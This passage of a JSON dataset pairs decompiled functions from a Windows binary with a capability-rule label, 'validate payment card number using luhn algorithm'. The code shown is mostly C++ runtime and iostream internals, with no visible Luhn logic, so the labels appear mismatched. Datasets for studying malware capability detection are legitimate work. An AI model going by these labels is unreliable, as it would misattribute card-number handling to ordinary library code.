        "decompiled_code": "\nvoid __fastcall fcn.004b8870(int32_t param_1)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    \n    puVar2 = *(param_1 + 8);\n    if (puVar2 == NULL) {\n        puVar2 = fcn.004c2c70(0xa8);\n        puVar2[1] = 0;\n        *puVar2 = 0x52c540;\n        puVar2[2] = 0;\n        puVar2[3] = 0;\n        *(puVar2 + 4) = 0;\n        puVar2[5] = 0;\n        puVar2[6] = 0;\n        puVar2[7] = 0;\n        puVar2[8] = 0;\n        puVar2[9] = 0;\n        *(puVar2 + 0x29) = 0;\n        *(param_1 + 8) = puVar2;\n    }\n    puVar2[2] = 0x5237c4;\n    iVar4 = *0x516da4;\n    iVar3 = 0;\n    puVar2[3] = 0;\n    *(puVar2 + 4) = 0;\n    puVar2[9] = 0x2c002e;\n    do {\n        *(puVar2 + iVar3 * 2 + 0x28) = *(iVar4 + iVar3);\n        iVar1 = *0x516da0;\n        iVar3 = iVar3 + 1;\n    } while (iVar3 != 0x24);\n    iVar4 = 0;\n    do {\n        *(puVar2 + iVar4 * 2 + 0x70) = *(iVar1 + iVar4);\n        iVar4 = iVar4 + 1;\n    } while (iVar4 != 0x1a);\n    puVar2[5] = 0x5237d0;\n    puVar2[6] = 4;\n    puVar2[7] = 0x5237da;\n    puVar2[8] = 5;\n    return;\n}\n",
        "token_count": 484
    },
    "004b8f30": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.004b8f30(code **param_1, int32_t param_2)\n\n{\n    code *pcVar1;\n    \n    *param_1 = vtable.0H.1.0;\n    param_1[1] = param_2 != 0;\n    pcVar1 = fcn.004ae940();\n    param_1[2] = pcVar1;\n    return;\n}\n",
        "token_count": 94
    },
    "004b9010": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.004b9010(uint *param_1, int32_t param_2)\n\n{\n    uint uVar1;\n    \n    *param_1 = 0x52ca84;\n    param_1[1] = param_2 != 0;\n    uVar1 = fcn.004ae940();\n    param_1[2] = uVar1;\n    return;\n}\n",
        "token_count": 89
    },
    "004b99c0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.004b99c0(int32_t param_1, uint param_2)\n\n{\n    uint *puVar1;\n    \n    for (puVar1 = *(param_1 + 0x18); puVar1 != NULL; puVar1 = *puVar1) {\n        (*puVar1[1])(param_2, param_1, puVar1[2]);\n    }\n    return;\n}\n",
        "token_count": 95
    },
    "004ba340": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.004ba340(int32_t param_1, int32_t param_2)\n\n{\n    uint *puVar1;\n    int32_t *piVar2;\n    uint uVar3;\n    uint uVar4;\n    uint *puVar5;\n    int32_t iVar6;\n    int32_t **ppiVar7;\n    int32_t iVar8;\n    int32_t **ppiVar9;\n    \n    iVar8 = param_1 + 0x24;\n    *(param_1 + 4) = *(param_2 + 4);\n    *(param_1 + 8) = *(param_2 + 8);\n    *(param_1 + 0xc) = *(param_2 + 0xc);\n    *(param_1 + 0x10) = *(param_2 + 0x10);\n    *(param_1 + 0x14) = *(param_2 + 0x14);\n    uVar3 = *(param_2 + 0x18);\n    *(param_2 + 0x18) = 0;\n    *(param_1 + 0x18) = uVar3;\n    iVar6 = *(param_1 + 0x68);\n    if ((iVar6 != 0) && (iVar6 != iVar8)) {\n        fcn.004c2c20(iVar6);\n    }\n    iVar6 = *(param_2 + 0x68);\n    if (iVar6 == param_2 + 0x24) {\n        *(param_1 + 0x68) = iVar8;\n        iVar6 = 0;\n        *(param_1 + 100) = 8;\n        while( true ) {\n            puVar1 = iVar8 + iVar6;\n            puVar5 = *(param_2 + 0x68) + iVar6;\n            iVar6 = iVar6 + 8;\n            uVar3 = *puVar5;\n            uVar4 = puVar5[1];\n            *puVar5 = 0;\n            puVar5[1] = 0;\n            *puVar1 = uVar3;\n            puVar1[1] = uVar4;\n            if (iVar6 == 0x40) break;\n            iVar8 = *(param_1 + 0x68);\n        }\n    }\n    else {\n        *(param_2 + 0x68) = param_2 + 0x24;\n        *(param_1 + 0x68) = iVar6;\n        uVar3 = *(param_2 + 100);\n        *(param_2 + 100) = 8;\n        *(param_1 + 100) = uVar3;\n    }\n    ppiVar7 = param_2 + 0x6c;\n    ppiVar9 = param_1 + 0x6c;\n    piVar2 = *ppiVar7;\n    if (*0x515a34 == 0) {\n        *piVar2 = *piVar2 + 1;\n        piVar2 = *ppiVar9;\n    }\n    else {\n        LOCK();\n        *piVar2 = *piVar2 + 1;\n        piVar2 = *ppiVar9;\n    }\n    if (*0x515a34 == 0) {\n        iVar8 = *piVar2;\n        *piVar2 = iVar8 + -1;\n    }\n    else {\n        LOCK();\n        iVar8 = *piVar2;\n        *piVar2 = *piVar2 + -1;\n    }\n    if (iVar8 == 1) {\n        fcn.004ae810();\n        fcn.004c2c30(piVar2);\n        *ppiVar9 = *ppiVar7;\n        return;\n    }\n    *ppiVar9 = *ppiVar7;\n    return;\n}\n",
        "token_count": 828
    },
    "004bad50": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004bad50(uint *param_1)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    int32_t *piVar4;\n    uint *puVar5;\n    int32_t **ppiVar6;\n    int32_t unaff_EBP;\n    ulong uVar7;\n    int32_t **ppiVar8;\n    \n    *param_1 = 0x52cbd4;\n    param_1[1] = 0;\n    param_1[2] = 0;\n    param_1[3] = 0;\n    param_1[4] = 0;\n    param_1[5] = 0;\n    param_1[6] = 0;\n    param_1[7] = 0;\n    param_1[8] = 0;\n    puVar3 = param_1 + 9;\n    do {\n        *puVar3 = 0;\n        puVar5 = puVar3 + 2;\n        puVar3[1] = 0;\n        puVar3 = puVar5;\n    } while (param_1 + 0x19 != puVar5);\n    param_1[0x19] = 8;\n    ppiVar6 = param_1 + 0x1b;\n    param_1[0x1a] = param_1 + 9;\n    *ppiVar6 = NULL;\n    fcn.004ac2f0();\n    piVar4 = *0x516f24;\n    *ppiVar6 = *0x516f24;\n    if (piVar4 == *0x516f08) {\n        if (*0x515a34 == 0) {\n            *piVar4 = *piVar4 + 1;\n            return;\n        }\n        goto code_r0x004aece0;\n    }\n    uVar1 = fcn.00448140();\n    if (*0x515a34 == 0) {\ncode_r0x004aec47:\n        piVar4 = *0x516f24;\n        **0x516f24 = **0x516f24 + 1;\n        *ppiVar6 = piVar4;\n    }\n    else {\n        iVar2 = fcn.004382e0(uVar1);\n        if (iVar2 != 0) {\n            uVar7 = fcn.00449d10();\n            if (uVar7 >> 0x20 == -1) {\n                uVar7 = fcn.004c2f10(uVar7);\n                if (uVar7 >> 0x20 != -1) goto code_r0x004c409b;\n                fcn.004c2f10(uVar7);\n            }\n            fcn.0043a8e0();\ncode_r0x004c409b:\n            fcn.0043a8e0();\n            fcn.004485f0();\n            ppiVar8 = ppiVar6;\n            do {\n                uVar7 = fcn.0043a8e0(ppiVar8);\n                ppiVar8 = uVar7;\n            } while (uVar7 >> 0x20 != -1);\n            fcn.004c2f10();\n            fcn.004aea60();\n            fcn.0043a8e0(uVar1);\n            fcn.004c2c30(ppiVar6);\n            fcn.0043a8e0(uVar1);\n            fcn.004aea60();\n            fcn.0043a8e0(uVar1);\n            fcn.004c2c30(ppiVar6);\n            fcn.0043a8e0(uVar1);\n            fcn.004aea60();\n            fcn.0043a8e0(uVar1);\n            fcn.004c2c30(ppiVar6);\n            fcn.0043a8e0(uVar1);\n            fcn.004aea60();\n            fcn.0043a8e0(uVar1);\n            fcn.004c2c30(ppiVar6);\n            fcn.0043a8e0(uVar1);\n            fcn.004aea60();\n            fcn.0043a8e0(uVar1);\n            fcn.004c2c30(ppiVar6);\n            fcn.0043a8e0(uVar1);\n            fcn.004aea60();\n            fcn.0043a8e0(uVar1);\n            fcn.004c2c30(ppiVar6);\n            fcn.0043a8e0(uVar1);\n            fcn.004aea60();\n            fcn.0043a8e0(uVar1);\n            fcn.004c2c30(ppiVar6);\n            fcn.0043a8e0(uVar1);\n            fcn.004aea60();\n            fcn.0043a8e0(uVar1);\n            fcn.004c2c30(ppiVar6);\n            fcn.0043a8e0(uVar1);\n            fcn.004aea60();\n            fcn.0043a8e0(uVar1);\n            fcn.004c2c30(ppiVar6);\n            fcn.0043a8e0(uVar1);\n            fcn.004aea60();\n            fcn.0043a8e0(uVar1);\n            fcn.004c2c30(ppiVar6);\n            fcn.0043a8e0(uVar1);\n            fcn.004aea60();\n            fcn.0043a8e0(uVar1);\n            fcn.004c2c30(ppiVar6);\n            fcn.0043a8e0(uVar1);\n            fcn.004aea60();\n            fcn.0043a8e0(uVar1);\n            fcn.004c2c30(ppiVar6);\n            fcn.0043a8e0(uVar1);\n            fcn.004aea60();\n            fcn.0043a8e0(ppiVar6);\n            fcn.004aea60();\n            fcn.0043a8e0(ppiVar6);\n            fcn.004aea60();\n            fcn.0043a8e0(ppiVar6);\n            fcn.004aea60();\n            fcn.0043a8e0(ppiVar6);\n            fcn.004aea60();\n            fcn.0043a8e0(ppiVar6);\n            fcn.004aea60();\n            fcn.0043a8e0(ppiVar6);\n            fcn.004aea60();\n            fcn.0043a8e0(ppiVar6);\n            fcn.004aea60();\n            fcn.0043a8e0(ppiVar6);\n            fcn.004aea60();\n            fcn.004c2c30();\n            fcn.0043a8e0(ppiVar6);\n            fcn.004aea60();\n            fcn.004c2c30();\n            fcn.0043a8e0(ppiVar6);\n            fcn.004aea60();\n            fcn.004c2c30();\n            fcn.0043a8e0(ppiVar6);\n            fcn.004c2c30();\n            fcn.0043a8e0(ppiVar6);\n            fcn.004aea60();\n            fcn.004c2c30();\n            fcn.0043a8e0(ppiVar6);\n            fcn.004aea60();\n            fcn.004c2c30();\n            fcn.0043a8e0(ppiVar6);\n            fcn.004aea60();\n            fcn.004c2c30();\n            fcn.0043a8e0(ppiVar6);\n            fcn.004c2c30();\n            fcn.0043a8e0(ppiVar6);\n            fcn.0048b630(unaff_EBP + -0x19);\n            fcn.0043a8e0(uVar1);\n            if (*(unaff_EBP + -0x1c) != NULL) {\n                (**(unaff_EBP + -0x1c))(uVar1);\n            }\n            fcn.0043a8e0(ppiVar6);\n            if (*(unaff_EBP + -0x1c) != NULL) {\n                (**(unaff_EBP + -0x1c))(uVar1);\n            }\n            fcn.0043a8e0(ppiVar6);\n            if (*(unaff_EBP + -0xc) != NULL) {\n                (**(unaff_EBP + -0xc))(uVar1);\n            }\n            fcn.0043a8e0(ppiVar6);\n            if (*(unaff_EBP + -0xc) != NULL) {\n                (**(unaff_EBP + -0xc))(uVar1);\n            }\n            fcn.0043a8e0(ppiVar6);\n            if (*(unaff_EBP + -0xc) != NULL) {\n                (**(unaff_EBP + -0xc))(uVar1);\n            }\n            fcn.0043a8e0(ppiVar6);\n            if (*(unaff_EBP + -0xc) != NULL) {\n                (**(unaff_EBP + -0xc))(uVar1);\n            }\n            fcn.0043a8e0(ppiVar6);\n            fcn.0048b630(unaff_EBP + -0x3d);\n            if (*(unaff_EBP + -0x1c) != NULL) {\n                (**(unaff_EBP + -0x1c))(ppiVar6);\n            }\n            fcn.0043a8e0(uVar1);\n            fcn.00483770(unaff_EBP + -0x3d);\n            if (*(unaff_EBP + -0x1c) != NULL) {\n                (**(unaff_EBP + -0x1c))();\n            }\n            fcn.0043a8e0(ppiVar6);\n            fcn.004aea60();\n            fcn.004c2c30(ppiVar6);\n            fcn.0043a8e0(uVar1);\n            fcn.004aea60();\n            fcn.004c2c30(ppiVar6);\n            fcn.0043a8e0(uVar1);\n            fcn.004aea60();\n            do {\n                fcn.004c2c30(ppiVar6);\n                fcn.0043a8e0(uVar1);\n                fcn.004c2c30(ppiVar6);\n                fcn.0043a8e0(uVar1);\n                fcn.00453450();\n                fcn.0048df30();\n            } while( true );\n        }\n        if (*0x515a34 == 0) goto code_r0x004aec47;\n        LOCK();\n        **0x516f24 = **0x516f24 + 1;\n        *ppiVar6 = *0x516f24;\n    }\n    if ((*0x515a34 == 0) || (iVar2 = fcn.00438340(uVar1),  iVar2 == 0)) {\n        return;\n    }\n    puVar3 = fcn.004c2d80(4);\n    *puVar3 = 0x52b51c;\n    piVar4 = fcn.004c3330(puVar3, 0x528194, 0x449b10);\ncode_r0x004aece0:\n    LOCK();\n    *piVar4 = *piVar4 + 1;\n    return;\n}\n",
        "token_count": 2525
    },
    "004bae40": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.004bae40(uint *param_1, uint param_2, uint param_3, int32_t param_4)\n\n{\n    uint uVar1;\n    \n    *param_1 = 0x52cbe4;\n    param_1[1] = param_4 != 0;\n    uVar1 = fcn.004ae940();\n    param_1[2] = uVar1;\n    return;\n}\n",
        "token_count": 100
    },
    "004bae80": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.004bae80(uint *param_1, int32_t param_2)\n\n{\n    uint uVar1;\n    \n    *param_1 = 0x52cbe4;\n    param_1[1] = param_2 != 0;\n    uVar1 = fcn.004ae940();\n    param_1[2] = uVar1;\n    return;\n}\n",
        "token_count": 90
    },
    "004baf00": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.004baf00(uint *param_1, int32_t param_2)\n\n{\n    uint uVar1;\n    \n    *param_1 = 0x52cbe4;\n    param_1[1] = param_2 != 0;\n    uVar1 = fcn.004ae940();\n    param_1[2] = uVar1;\n    return;\n}\n",
        "token_count": 90
    },
    "004bafd0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.004bafd0(uint *param_1, uint param_2, uint param_3, int32_t param_4)\n\n{\n    uint uVar1;\n    \n    *param_1 = 0x52cc00;\n    param_1[1] = param_4 != 0;\n    uVar1 = fcn.004ae940();\n    param_1[2] = uVar1;\n    return;\n}\n",
        "token_count": 99
    },
    "004bb010": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.004bb010(uint *param_1, int32_t param_2)\n\n{\n    uint uVar1;\n    \n    *param_1 = 0x52cc00;\n    param_1[1] = param_2 != 0;\n    uVar1 = fcn.004ae940();\n    param_1[2] = uVar1;\n    return;\n}\n",
        "token_count": 88
    },
    "004bb090": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.004bb090(uint *param_1, int32_t param_2)\n\n{\n    uint uVar1;\n    \n    *param_1 = 0x52cc00;\n    param_1[1] = param_2 != 0;\n    uVar1 = fcn.004ae940();\n    param_1[2] = uVar1;\n    return;\n}\n",
        "token_count": 88
    },
    "004bb160": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004bb160(int32_t param_1)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint *puVar4;\n    \n    puVar4 = *(param_1 + 8);\n    if (puVar4 == NULL) {\n        puVar4 = fcn.004c2c70(0x68);\n        puVar4[1] = 0;\n        *puVar4 = 0x52c530;\n        puVar4[2] = 0;\n        puVar4[3] = 0;\n        *(puVar4 + 4) = 0;\n        puVar4[5] = 0;\n        puVar4[6] = 0;\n        puVar4[7] = 0;\n        puVar4[8] = 0;\n        *(puVar4 + 9) = 0;\n        *(puVar4 + 0x19) = 0;\n        *(param_1 + 8) = puVar4;\n    }\n    puVar4[2] = 0x5237e8;\n    iVar3 = *0x516da4;\n    *(*(param_1 + 8) + 0xc) = 0;\n    *(*(param_1 + 8) + 0x10) = 0;\n    *(*(param_1 + 8) + 0x24) = 0x2e;\n    *(*(param_1 + 8) + 0x25) = 0x2c;\n    iVar2 = 0;\n    do {\n        *(*(param_1 + 8) + 0x26 + iVar2) = *(iVar3 + iVar2);\n        iVar1 = *0x516da0;\n        iVar2 = iVar2 + 1;\n    } while (iVar2 != 0x24);\n    iVar3 = 0;\n    do {\n        *(*(param_1 + 8) + 0x4a + iVar3) = *(iVar1 + iVar3);\n        iVar3 = iVar3 + 1;\n    } while (iVar3 != 0x1a);\n    *(*(param_1 + 8) + 0x14) = 0x5237e9;\n    *(*(param_1 + 8) + 0x18) = 4;\n    *(*(param_1 + 8) + 0x1c) = 0x5237ee;\n    *(*(param_1 + 8) + 0x20) = 5;\n    return;\n}\n",
        "token_count": 572
    },
    "004bb4b0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004bb4b0(int32_t param_1)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    \n    puVar2 = *(param_1 + 8);\n    if (puVar2 == NULL) {\n        puVar2 = fcn.004c2c70(0xa8);\n        puVar2[1] = 0;\n        *puVar2 = 0x52c540;\n        puVar2[2] = 0;\n        puVar2[3] = 0;\n        *(puVar2 + 4) = 0;\n        puVar2[5] = 0;\n        puVar2[6] = 0;\n        puVar2[7] = 0;\n        puVar2[8] = 0;\n        puVar2[9] = 0;\n        *(puVar2 + 0x29) = 0;\n        *(param_1 + 8) = puVar2;\n    }\n    puVar2[2] = 0x5237e8;\n    iVar4 = *0x516da4;\n    iVar3 = 0;\n    puVar2[3] = 0;\n    *(puVar2 + 4) = 0;\n    puVar2[9] = 0x2c002e;\n    do {\n        *(puVar2 + iVar3 * 2 + 0x28) = *(iVar4 + iVar3);\n        iVar1 = *0x516da0;\n        iVar3 = iVar3 + 1;\n    } while (iVar3 != 0x24);\n    iVar4 = 0;\n    do {\n        *(puVar2 + iVar4 * 2 + 0x70) = *(iVar1 + iVar4);\n        iVar4 = iVar4 + 1;\n    } while (iVar4 != 0x1a);\n    puVar2[5] = 0x5237f4;\n    puVar2[6] = 4;\n    puVar2[7] = 0x5237fe;\n    puVar2[8] = 5;\n    return;\n}\n",
        "token_count": 485
    },
    "004bba60": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.004bba60(int32_t param_1, uint param_2)\n\n{\n    char cVar1;\n    uint uVar2;\n    \n    cVar1 = fcn.004bf230(param_2);\n    if (cVar1 == '\\0') {\n        *(param_1 + 0x7c) = 0;\n    }\n    else {\n        uVar2 = fcn.004c0160(param_2);\n        *(param_1 + 0x7c) = uVar2;\n    }\n    cVar1 = fcn.004bf4b0(param_2);\n    if (cVar1 == '\\0') {\n        *(param_1 + 0x80) = 0;\n    }\n    else {\n        uVar2 = fcn.004c0460(param_2);\n        *(param_1 + 0x80) = uVar2;\n    }\n    cVar1 = fcn.004bf410(param_2);\n    if (cVar1 == '\\0') {\n        *(param_1 + 0x84) = 0;\n    }\n    else {\n        uVar2 = fcn.004c03a0(param_2);\n        *(param_1 + 0x84) = uVar2;\n    }\n    return;\n}\n",
        "token_count": 287
    },
    "004bbdd0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t __thiscall fcn.004bbdd0(int32_t param_1, int32_t param_2)\n\n{\n    char cVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint uVar4;\n    int32_t *piVar5;\n    uchar uVar6;\n    uint *puVar7;\n    uint32_t extraout_ECX;\n    uint32_t extraout_ECX_00;\n    int32_t iVar8;\n    int32_t extraout_ECX_01;\n    int32_t iVar9;\n    int32_t iStack132;\n    uint uStack128;\n    uint32_t in_stack_ffffff98;\n    int32_t iStack80;\n    uchar auStack64 [20];\n    uint32_t uStack24;\n    \n    uVar2 = *(param_1 + 0x78);\n    *(param_1 + 0x78) = param_2;\n    *(param_1 + 0x14) = param_2 == 0;\n    if ((*(param_1 + 0x10) & param_2 == 0) == 0) {\n        return uVar2;\n    }\n    fcn.004bdff0(\"basic_ios::clear\");\n    if (extraout_ECX_00 == uStack24) {\n        return extraout_ECX_00;\n    }\n    iVar8 = *(uStack24 + 100);\n    if (8 < iVar8) {\n        if (0xfffffff < iVar8) goto code_r0x004bbce0;\n        puVar7 = fcn.004c2c50(iVar8 << 3);\n        iVar8 = *(uStack24 + 100) + -1;\n        if (-1 < iVar8) {\n            do {\n                iVar8 = iVar8 + -1;\n                *puVar7 = 0;\n                puVar7[1] = 0;\n                puVar7 = puVar7 + 2;\n            } while (iVar8 != -1);\n        }\n    }\n    iVar8 = *(uStack24 + 0x18);\n    if (iVar8 != 0) {\n        if (*0x515a34 == 0) {\n            *(iVar8 + 0xc) = *(iVar8 + 0xc) + 1;\n        }\n        else {\n            LOCK();\n            *(iVar8 + 0xc) = *(iVar8 + 0xc) + 1;\n        }\n    }\n    in_stack_ffffff98 = 0;\n    fcn.004b99c0();\n    iVar3 = *(extraout_ECX_00 + 0x68);\n    if (iVar3 != extraout_ECX_00 + 0x24) {\n        if (iVar3 != 0) {\n            fcn.004c2c20(iVar3);\n        }\n        *(extraout_ECX_00 + 0x68) = 0;\n    }\n    fcn.004b9a40();\n    iVar3 = *(uStack24 + 100);\n    *(extraout_ECX_00 + 0x18) = iVar8;\n    if (0 < iVar3) {\n        iVar8 = *(uStack24 + 0x68);\n        iVar9 = 0;\n        do {\n            uVar4 = *(iVar8 + 4 + iVar9);\n            *(iStack80 + iVar9) = *(iVar8 + iVar9);\n            *(iStack80 + 4 + iVar9) = uVar4;\n            iVar9 = iVar9 + 8;\n        } while (iVar9 != iVar3 * 8);\n    }\n    *(extraout_ECX_00 + 0x68) = iStack80;\n    uVar4 = *(uStack24 + 0xc);\n    *(extraout_ECX_00 + 100) = iVar3;\n    cVar1 = *(uStack24 + 0x75);\n    *(extraout_ECX_00 + 0xc) = uVar4;\n    *(extraout_ECX_00 + 8) = *(uStack24 + 8);\n    *(extraout_ECX_00 + 4) = *(uStack24 + 4);\n    *(extraout_ECX_00 + 0x70) = *(uStack24 + 0x70);\n    if (cVar1 == '\\0') {\n        piVar5 = *(uStack24 + 0x7c);\n        if (piVar5 != NULL) {\n            if (*(piVar5 + 7) == '\\0') {\n                fcn.004512b0();\n                uVar6 = 0x20;\n                if (*(*piVar5 + 0x18) != 0x451560) {\n                    uVar6 = (**(*piVar5 + 0x18))(0x20);\n                }\n            }\n            else {\n                uVar6 = *(piVar5 + 0x3d);\n            }\n            *(uStack24 + 0x74) = uVar6;\n            *(uStack24 + 0x75) = 1;\n            cVar1 = *(extraout_ECX_00 + 0x75);\n            goto joined_r0x004bbfd0;\n        }\n    }\n    else {\n        cVar1 = *(extraout_ECX_00 + 0x75);\n        uVar6 = *(uStack24 + 0x74);\njoined_r0x004bbfd0:\n        if (cVar1 != '\\0') {\ncode_r0x004bbef6:\n            *(extraout_ECX_00 + 0x74) = uVar6;\n            fcn.004aebe0(uStack24 + 0x6c);\n            fcn.004aed50(auStack64);\n            fcn.004aed00();\n            fcn.004bba60(extraout_ECX_00 + 0x6c);\n            fcn.004b99c0(2);\n            *(extraout_ECX_00 + 0x10) = *(uStack24 + 0x10);\n            fcn.004bbce0(*(extraout_ECX_00 + 0x14));\n            return extraout_ECX_00;\n        }\n        piVar5 = *(extraout_ECX_00 + 0x7c);\n        if (piVar5 != NULL) {\n            if (*(piVar5 + 7) == '\\0') {\n                fcn.004512b0();\n                if (*(*piVar5 + 0x18) != 0x451560) {\n                    (**(*piVar5 + 0x18))(0x20);\n                }\n            }\n            *(extraout_ECX_00 + 0x75) = 1;\n            goto code_r0x004bbef6;\n        }\n    }\n    fcn.004bde60();\ncode_r0x004bbce0:\n    fcn.004c33a0();\n    in_stack_ffffff98 = in_stack_ffffff98 | *(extraout_ECX_01 + 0x14);\n    if (*(extraout_ECX_01 + 0x78) == 0) {\n        in_stack_ffffff98 = in_stack_ffffff98 | 1;\n    }\n    *(extraout_ECX_01 + 0x14) = in_stack_ffffff98;\n    if ((*(extraout_ECX_01 + 0x10) & in_stack_ffffff98) != 0) {\n        fcn.004bdff0(\"basic_ios::clear\");\n        fcn.004aebe0(iStack132 + 0x6c);\n        fcn.004ba260(iStack132, uStack128);\n        fcn.004aed00();\n        fcn.004bba60(uStack128);\n        piVar5 = *(iStack132 + 0x78);\n        if (piVar5 != NULL) {\n            fcn.004aebe0(piVar5 + 7);\n            (**(*piVar5 + 8))(uStack128);\n            fcn.004aed50(uStack128);\n            fcn.004aed00();\n        }\n        return extraout_ECX;\n    }\n    return in_stack_ffffff98;\n}\n",
        "token_count": 1772
    },
    "004bc290": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.004bc290(int32_t param_1, uint param_2)\n\n{\n    char cVar1;\n    uint uVar2;\n    \n    cVar1 = fcn.004bf280(param_2);\n    if (cVar1 == '\\0') {\n        *(param_1 + 0x7c) = 0;\n    }\n    else {\n        uVar2 = fcn.004c01c0(param_2);\n        *(param_1 + 0x7c) = uVar2;\n    }\n    cVar1 = fcn.004bf500(param_2);\n    if (cVar1 == '\\0') {\n        *(param_1 + 0x80) = 0;\n    }\n    else {\n        uVar2 = fcn.004c04c0(param_2);\n        *(param_1 + 0x80) = uVar2;\n    }\n    cVar1 = fcn.004bf460(param_2);\n    if (cVar1 == '\\0') {\n        *(param_1 + 0x84) = 0;\n    }\n    else {\n        uVar2 = fcn.004c0400(param_2);\n        *(param_1 + 0x84) = uVar2;\n    }\n    return;\n}\n",
        "token_count": 285
    },
    "004bc5f0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t __thiscall fcn.004bc5f0(int32_t param_1, int32_t param_2)\n\n{\n    char cVar1;\n    int32_t *piVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint uVar5;\n    ushort uVar6;\n    uint *puVar7;\n    uint32_t extraout_ECX;\n    uint32_t extraout_ECX_00;\n    int32_t iVar8;\n    int32_t extraout_ECX_01;\n    int32_t iVar9;\n    int32_t iStack132;\n    uint uStack128;\n    uint32_t in_stack_ffffff98;\n    int32_t iStack80;\n    uchar auStack64 [20];\n    uint32_t uStack24;\n    \n    uVar3 = *(param_1 + 0x78);\n    *(param_1 + 0x78) = param_2;\n    *(param_1 + 0x14) = param_2 == 0;\n    if ((*(param_1 + 0x10) & param_2 == 0) == 0) {\n        return uVar3;\n    }\n    fcn.004bdff0(\"basic_ios::clear\");\n    if (extraout_ECX_00 == uStack24) {\n        return extraout_ECX_00;\n    }\n    iVar8 = *(uStack24 + 100);\n    if (8 < iVar8) {\n        if (0xfffffff < iVar8) goto code_r0x004bc500;\n        puVar7 = fcn.004c2c50(iVar8 << 3);\n        iVar8 = *(uStack24 + 100) + -1;\n        if (-1 < iVar8) {\n            do {\n                iVar8 = iVar8 + -1;\n                *puVar7 = 0;\n                puVar7[1] = 0;\n                puVar7 = puVar7 + 2;\n            } while (iVar8 != -1);\n        }\n    }\n    iVar8 = *(uStack24 + 0x18);\n    if (iVar8 != 0) {\n        if (*0x515a34 == 0) {\n            *(iVar8 + 0xc) = *(iVar8 + 0xc) + 1;\n        }\n        else {\n            LOCK();\n            *(iVar8 + 0xc) = *(iVar8 + 0xc) + 1;\n        }\n    }\n    in_stack_ffffff98 = 0;\n    fcn.004b99c0();\n    iVar4 = *(extraout_ECX_00 + 0x68);\n    if (iVar4 != extraout_ECX_00 + 0x24) {\n        if (iVar4 != 0) {\n            fcn.004c2c20(iVar4);\n        }\n        *(extraout_ECX_00 + 0x68) = 0;\n    }\n    fcn.004b9a40();\n    iVar4 = *(uStack24 + 100);\n    *(extraout_ECX_00 + 0x18) = iVar8;\n    if (0 < iVar4) {\n        iVar8 = *(uStack24 + 0x68);\n        iVar9 = 0;\n        do {\n            uVar5 = *(iVar8 + 4 + iVar9);\n            *(iStack80 + iVar9) = *(iVar8 + iVar9);\n            *(iStack80 + 4 + iVar9) = uVar5;\n            iVar9 = iVar9 + 8;\n        } while (iVar9 != iVar4 * 8);\n    }\n    *(extraout_ECX_00 + 0x68) = iStack80;\n    uVar5 = *(uStack24 + 0xc);\n    *(extraout_ECX_00 + 100) = iVar4;\n    cVar1 = *(uStack24 + 0x76);\n    *(extraout_ECX_00 + 0xc) = uVar5;\n    *(extraout_ECX_00 + 8) = *(uStack24 + 8);\n    *(extraout_ECX_00 + 4) = *(uStack24 + 4);\n    *(extraout_ECX_00 + 0x70) = *(uStack24 + 0x70);\n    if (cVar1 == '\\0') {\n        if (*(uStack24 + 0x7c) != NULL) {\n            uVar6 = (**(**(uStack24 + 0x7c) + 0x28))(0x20);\n            *(uStack24 + 0x76) = 1;\n            cVar1 = *(extraout_ECX_00 + 0x76);\n            *(uStack24 + 0x74) = uVar6;\n            goto joined_r0x004bc7f4;\n        }\n    }\n    else {\n        cVar1 = *(extraout_ECX_00 + 